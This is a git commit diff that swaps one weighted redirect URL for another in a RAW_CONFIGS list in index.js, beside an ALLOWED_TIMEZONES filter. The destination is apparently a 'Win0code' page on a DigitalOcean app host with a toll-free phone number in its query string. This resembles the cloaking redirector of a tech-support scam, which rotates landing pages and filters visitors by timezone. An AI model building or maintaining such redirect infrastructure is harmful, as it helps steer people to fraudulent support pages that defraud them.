7ee41dd811a0ba4275a6b2b87afabac0fd2215c7
paalakash <palaksh452@gmail.com>
2026-06-15 10:43:41 +0530

    Update RAW_CONFIGS with new URL

--- index.js
+++ index.js
@@ -31,7 +31,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://hammerhead-app-f7ab8.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-855-520-4162", weight: 1.0 }
+    { url: "https://seal-app-i9w6q.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-855-520-4162", weight: 1.0 }
 
 ];
 
